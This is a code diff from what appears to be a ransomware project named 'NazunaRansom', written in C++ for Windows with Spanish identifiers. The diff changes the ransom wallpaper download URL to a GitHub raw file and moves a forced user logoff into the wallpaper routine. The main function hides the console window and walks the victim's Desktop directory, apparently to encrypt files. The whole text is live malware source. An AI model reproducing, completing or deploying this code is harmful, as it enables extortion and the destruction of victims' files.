@@ -110,23 +110,22 @@ void cambiar_fondo() {
     DWORD username_tam = USER_TAM;
     
     GetUserNameA(username, &username_tam);
-    const char* url = "https://w.wallhaven.cc/full/wq/wallhaven-wqpywp.jpg";
+    const char* url = "https://raw.githubusercontent.com/ic4rta/NazunaRansom/main/Nazuna_Ransom_Fondo.jpg";
 
     string destino_guardar = "C:\\Users\\";
     destino_guardar += username;
-    destino_guardar += "\\Downloads\\NazunaRansom.jpg";
+    destino_guardar += "\\Downloads\\Nazuna_Ransom_Fondo.jpg";
     
     LPCSTR lpcstr_destino = destino_guardar.c_str();
     
     URLDownloadToFile(NULL, url, lpcstr_destino, 0, NULL);
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)lpcstr_destino, SPIF_UPDATEINIFILE);
+    ExitWindowsEx(EWX_LOGOFF, 0);
 }
 
 int main() {
     HWND ventana_cmd = GetConsoleWindow();
 	ShowWindow(ventana_cmd, SW_HIDE);
-
-    ExitWindowsEx(EWX_LOGOFF, 0);
 
     string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
     recorrer_dir(ruta);
